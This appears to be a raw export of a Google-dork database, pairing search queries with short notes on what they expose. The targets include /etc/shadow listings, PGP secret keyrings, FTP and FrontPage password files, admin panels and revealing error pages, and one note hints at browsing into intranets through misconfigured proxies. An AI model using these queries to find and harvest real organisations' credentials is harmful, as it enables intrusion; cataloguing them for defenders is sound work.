&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;95&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Usage Statistics for" "Generated by Webalizer"&quot;;&quot;The webalizer program shows web statistics for web servers. This information includes who is visiting the site, what pages they visit, error codes produced, filetypes hosted on the server, number of hits, referrers, exit pages, and more which can provide very interesting recon information for an attacker.&quot;
&quot;96&quot;;&quot;2004-03-04&quot;;&quot;"robots.txt" "Disallow:" filetype:txt&quot;;&quot;The robots.txt file serves as a set of instructions for web crawlers. The "disallow" tag tells a web crawler where NOT to look, for whatever reason. Hackers will always go to those places first!&quot;
&quot;97&quot;;&quot;2004-08-25&quot;;&quot;"Warning: pg_connect(): Unable to connect to PostgreSQL server: FATAL"&quot;;&quot;This search reveals Postgresql servers in yet another way then we had seen before. Path information appears in the error message and sometimes database names.&quot;
&quot;98&quot;;&quot;2004-03-04&quot;;&quot;"phpMyAdmin" "running on" inurl:"main.php"&quot;;&quot;From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but lock it down! Things you can do include viewing MySQL runtime information and  system variables, show processes, reloading MySQL, changing privileges, and modifying or exporting databases. Hacker-fodder for sure!&quot;
&quot;99&quot;;&quot;2004-03-04&quot;;&quot;inurl:main.php phpMyAdmin&quot;;&quot;From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but lock it down! Things you can do include viewing MySQL runtime information and  system variables, show processes, reloading MySQL, changing privileges, and modifying or exporting databases. Hacker-fodder for sure!&quot;
&quot;100&quot;;&quot;2004-03-04&quot;;&quot;inurl:main.php Welcome to phpMyAdmin&quot;;&quot;From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but lock it down! Things you can do include viewing MySQL runtime information and  system variables, show processes, reloading MySQL, changing privileges, and modifying or exporting databases. Hacker-fodder for sure!&quot;
&quot;101&quot;;&quot;2004-03-04&quot;;&quot;"Warning: Cannot modify header information - headers already sent"&quot;;&quot;A PHP error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;102&quot;;&quot;2004-03-04&quot;;&quot;intitle:"wbem" compaq login "Compaq Information Technologies Group"&quot;;&quot;These devices are running HP Insight Management Agents for Servers which "provide device information for all managed subsystems. Alerts are generated by SNMP traps." The information on these pages include server addresses and other assorted SNMP information.&quot;
&quot;103&quot;;&quot;2004-03-04&quot;;&quot;intitle:osCommerce inurl:admin intext:"redistributable under the GNU"intext:"Online Catalog" -demo -site:oscommerce.com&quot;;&quot;This is a decent way to explore the admin interface of osCommerce e-commerce sites. Depending on how bad the setup of the web store is, web surfers can even Google their way into customer details and order status, all from the Google cache.&quot;
&quot;104&quot;;&quot;2004-03-04&quot;;&quot;intitle:index.of "Apache" "server at"&quot;;&quot;This is a very basic string found on directory listing pages which show the version of the Apache web server. Hackers can use this information to find vulnerable targets without querying the servers.&quot;
&quot;105&quot;;&quot;2004-03-04&quot;;&quot;"access denied for user" "using password"&quot;;&quot;Another SQL error message, this message can display the username, database, path names and partial SQL code, all of which are very helpful for hackers...&quot;
&quot;106&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Under construction" "does not currently have"&quot;;&quot;This error message can be used to narrow down the operating system and web server version which can be used by hackers to mount a specific attack.&quot;
&quot;107&quot;;&quot;2004-03-04&quot;;&quot;"seeing this instead" intitle:"test page for apache"&quot;;&quot;This is the default web page for Apache 1.3.11 - 1.3.26. Hackers can use this information to determine the version of the web server, or to search Google for vulnerable targets. In addition, this indicates that the web server is not well maintained.&quot;
&quot;108&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Test Page for Apache" "It Worked!"&quot;;&quot;This is the default web page for Apache 1.2.6 - 1.3.9. Hackers can use this information to determine the version of the web server, or to search Google for vulnerable targets. In addition, this indicates that the web server is not well maintained.&quot;
&quot;109&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Test Page for Apache" "It Worked!" "on this web"&quot;;&quot;This is the default web page for Apache 1.2.6 - 1.3.9. Hackers can use this information to determine the version of the web server, or to search Google for vulnerable targets. In addition, this indicates that the web server is not well maintained.&quot;
&quot;110&quot;;&quot;2004-03-04&quot;;&quot;"Can&#039;t connect to local" intitle:warning&quot;;&quot;Another SQL error message, this message can display database name, path names and partial SQL code, all of which are very helpful for hackers...&quot;
&quot;111&quot;;&quot;2004-03-04&quot;;&quot;intitle:index.of dead.letter&quot;;&quot;dead.letter contains the contents of unfinished emails created on the UNIX platform. Emails (finished or not) can contain sensitive information.&quot;
&quot;112&quot;;&quot;2004-03-04&quot;;&quot;intitle:index.of ws_ftp.ini&quot;;&quot;ws_ftp.ini is a configuration file for a popular FTP client that stores usernames, (weakly) encoded passwords, sites and directories that the user can store for later reference. These should not be on the web!&quot;
&quot;113&quot;;&quot;2004-03-04&quot;;&quot;intitle:index.of administrators.pwd&quot;;&quot;This file contains administrative user names and (weakly) encrypted password for Microsoft Front Page. The file should not be readble to the general public.&quot;
&quot;114&quot;;&quot;2004-03-04&quot;;&quot;inurl:secring ext:skr | ext:pgp | ext:bak&quot;;&quot;This file is the secret keyring for PGP encryption. Armed with this file (and perhaps a passphrase), a malicious user can read all your encrypted files! This should not be posted on the web!&quot;
&quot;115&quot;;&quot;2004-03-04&quot;;&quot;intitle:Index.of etc shadow&quot;;&quot;This file contains usernames and (lame) encrypted passwords! Armed with this file and a decent password cracker, an attacker can crack passwords and log into a UNIX system.&quot;
&quot;116&quot;;&quot;2004-03-04&quot;;&quot;inurl:ManyServers.htm&quot;;&quot;Microsoft Terminal Services Multiple Clients pages. These pages are not necessarily insecure, sine many layers of security can be wrapped around the actual use of this service, but simply being able to find these in Google gives hackers an informational advantage, and many of the sites are not implemented securely.&quot;
&quot;117&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Terminal Services Web Connection"&quot;;&quot;Microsoft Terminal Services Web Connector pages. These pages are not necessarily insecure, sine many layers of security can be wrapped around the actual use of this service, but simply being able to find these in Google gives hackers an informational advantage, and many of the sites are not implemented securely. In the worst case scenario these pages may allow an attacker to bypass a firewall gaining access to a "protected" machine.&quot;
&quot;118&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Remote Desktop Web Connection"&quot;;&quot;Microsoft Remote Desktop Connection Web Connection pages. These pages are not necessarily insecure, sine many layers of security can be wrapped around the actual use of this service, but simply being able to find these in Google gives hackers an informational advantage, and many of the sites are not implemented securely. In the worst case scenario these pages may allow an attacker to bypass a firewall gaining access to an otherwise inaccessible machine.&quot;
&quot;119&quot;;&quot;0000-00-00&quot;;&quot;"Welcome to Intranet"&quot;;&quot;According to whatis.com: "An intranet is a private network that is contained within an enterprise. [...] The main purpose of an intranet is to share company information and computing resources among employees [...] and in general looks like a private version of the Internet." Intranets, by definition should not be available to the Internet&#039;s unwashed masses as they may contain private corporate information.&quot;
&quot;120&quot;;&quot;2004-03-04&quot;;&quot;inurl:search.php vbulletin&quot;;&quot;Version 3.0.0 candidate 4 and earlier of Vbulletin may have a cross-site scripting vulnerability. See http://www.securityfocus.com/bid/9656 for more info.&quot;
&quot;121&quot;;&quot;2004-03-14&quot;;&quot;inurl:footer.inc.php&quot;;&quot;From http://www.securityfocus.com/bid/9664, the AllMyPHP family of products (Versions 0.1.2 - 0.4) contains several potential vulnerabilities, som elalowing an attacker to execute malicious code on the web server.&quot;
&quot;122&quot;;&quot;2004-03-14&quot;;&quot;inurl:info.inc.php&quot;;&quot;From http://www.securityfocus.com/bid/9664, the AllMyPHP family of products (Versions 0.1.2 - 0.4) contains several potential vulnerabilities, som elalowing an attacker to execute malicious code on the web server.&quot;
&quot;123&quot;;&quot;2004-03-14&quot;;&quot;inurl:admin intitle:login&quot;;&quot;This search can find administrative login pages. Not a vulnerability in and of itself, this query serves as a locator for administrative areas of a site. Further investigation of the surrounding directories can often reveal interesting information.&quot;
&quot;125&quot;;&quot;2004-03-16&quot;;&quot;filetype:asp "Custom Error Message" Category Source&quot;;&quot;This is an ASP error message that can reveal information such as compiler used, language used, line numbers, program names and partial source code.&quot;
&quot;126&quot;;&quot;2004-03-16&quot;;&quot;"Fatal error: Call to undefined function" -reply -the -next&quot;;&quot;This error message can reveal information such as compiler used, language used, line numbers, program names and partial source code.&quot;
&quot;127&quot;;&quot;2004-03-16&quot;;&quot;inurl:admin filetype:xls&quot;;&quot;This search can find Excel spreadsheets in an administrative directory or of an administrative nature. Many times these documents contain sensitive information.&quot;
&quot;128&quot;;&quot;2004-03-16&quot;;&quot;inurl:admin inurl:userlist&quot;;&quot;This search reveals userlists of administrative importance. Userlists found using this method can range from benign "message group" lists to system userlists containing passwords.&quot;
&quot;129&quot;;&quot;2004-03-16&quot;;&quot;inurl:admin filetype:asp inurl:userlist&quot;;&quot;This search reveals userlists of administrative importance. Userlists found using this method can range from benign "message group" lists to system userlists containing passwords.&quot;
&quot;130&quot;;&quot;2004-03-16&quot;;&quot;inurl:backup intitle:index.of inurl:admin&quot;;&quot;This query reveals backup directories. These directories can contain various information ranging from source code, sql tables, userlists, and even passwords.&quot;
&quot;131&quot;;&quot;2004-03-18&quot;;&quot;"Welcome to PHP-Nuke" congratulations&quot;;&quot;This finds default installations of the postnuke CMS system. In many cases, default installations can be insecure especially considering that the administrator hasn&#039;t gotten past the first few installation steps.&quot;
&quot;132&quot;;&quot;2004-03-18&quot;;&quot;allintitle:Netscape FastTrack Server Home Page&quot;;&quot;This finds default installations of Netscape Fasttrack Server. In many cases, default installations can be insecure especially considering that the administrator hasn&#039;t gotten past the first few installation steps.&quot;
